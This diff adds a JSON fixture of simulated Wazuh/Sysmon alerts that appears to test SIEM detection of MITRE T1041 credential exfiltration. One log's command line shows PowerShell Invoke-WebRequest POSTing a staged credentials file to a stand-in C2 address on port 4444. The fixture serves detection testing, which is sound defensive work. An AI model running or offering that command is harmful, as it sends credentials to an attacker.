@@ -1,0 +1,173 @@
+{
+  "_metadata": {
+    "attack_id": "T1041",
+    "variation": "002",
+    "name": "HTTP POST to C2 - PowerShell Invoke-WebRequest",
+    "description": "Exfiltrate staged credentials to C2 server via HTTP POST",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "exfiltration",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Sysmon Event 1 - PowerShell POST to C2",
+      "sequence": 1,
+      "timestamp": "2026-02-10T18:26:00.000Z",
+      "log": {
+        "timestamp": "2026-02-10T18:26:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 1: C2 Exfiltration via HTTP POST",
+          "id": "100603",
+          "mitre": {
+            "id": [
+              "T1041"
+            ],
+            "tactic": [
+              "Exfiltration"
+            ],
+            "technique": [
+              "Exfiltration Over C2 Channel"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": true,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707589560.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "1",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "1",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-10 18:26:00.000",
+              "processGuid": "{8df8f34e-2810-65c7-004A-000000000400}",
+              "processId": "10001",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "commandLine": "powershell.exe -Command \"Invoke-WebRequest -Uri 'http://198.51.100.110:4444/upload' -Method POST -InFile 'C:\\staging\\credentials.txt'\"",
+              "currentDirectory": "C:\\Users\\admin2\\",
+              "user": "CORP\\admin2",
+              "integrityLevel": "Medium",
+              "hashes": "SHA256=9ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF012345678",
+              "parentProcessGuid": "{8df8f34e-2810-65c7-0000-000000000400}",
+              "parentProcessId": "4456",
+              "parentImage": "C:\\Windows\\System32\\cmd.exe",
+              "parentCommandLine": "cmd.exe"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_batch": 9,
+        "fomorian_campaign": 28,
+        "fomorian_technique": "T1041",
+        "fomorian_technique_name": "HTTP POST to C2 - PowerShell Invoke-WebRequest"
+      }
+    },
+    {
+      "_comment": "Sysmon Event 3 - HTTP to C2 server",
+      "sequence": 2,
+      "timestamp": "2026-02-10T18:26:01.000Z",
+      "log": {
+        "timestamp": "2026-02-10T18:26:01.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon - Event 3: HTTP Connection to C2 Server",
+          "id": "100604",
+          "mitre": {
+            "id": [
+              "T1041",
+              "T1071.001"
+            ],
+            "tactic": [
+              "Exfiltration",
+              "Command and Control"
+            ],
+            "technique": [
+              "Exfiltration Over C2 Channel",
+              "Web Protocols"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": true,
+          "groups": [
+            "sysmon",
+            "sysmon_event3",
+            "windows"
+          ]
+        },
+        "agent": {
+          "id": "020",
+          "name": "WS01",
+          "ip": "198.51.100.20"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707589561.000001",
+        "decoder": {
+          "name": "windows_eventchannel"
+        },
+        "location": "EventChannel",
+        "data": {
+          "win": {
+            "system": {
+              "eventID": "3",
+              "channel": "Microsoft-Windows-Sysmon/Operational",
+              "providerName": "Microsoft-Windows-Sysmon",
+              "computer": "WS01.corp.local",
+              "level": "4",
+              "task": "3",
+              "severityValue": "INFORMATION"
+            },
+            "eventdata": {
+              "utcTime": "2026-02-10 18:26:01.000",
+              "processGuid": "{8df8f34e-2810-65c7-004A-000000000400}",
+              "processId": "10001",
+              "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+              "user": "CORP\\admin2",
+              "protocol": "tcp",
+              "initiated": "true",
+              "sourceIsIpv6": "false",
+              "sourceIp": "198.51.100.20",
+              "sourceHostname": "WS01.corp.local",
+              "sourcePort": "55678",
+              "destinationIsIpv6": "false",
+              "destinationIp": "198.51.100.110",
+              "destinationHostname": "KALI01.corp.local",
+              "destinationPort": "4444"
+            }
+          }
+        },
+        "_fomorian_test": true,
+        "fomorian_batch": 9,
+        "fomorian_campaign": 28,
+        "fomorian_technique": "T1041",
+        "fomorian_technique_name": "HTTP POST to C2 - PowerShell Invoke-WebRequest"
+      }
+    }
+  ]
+}
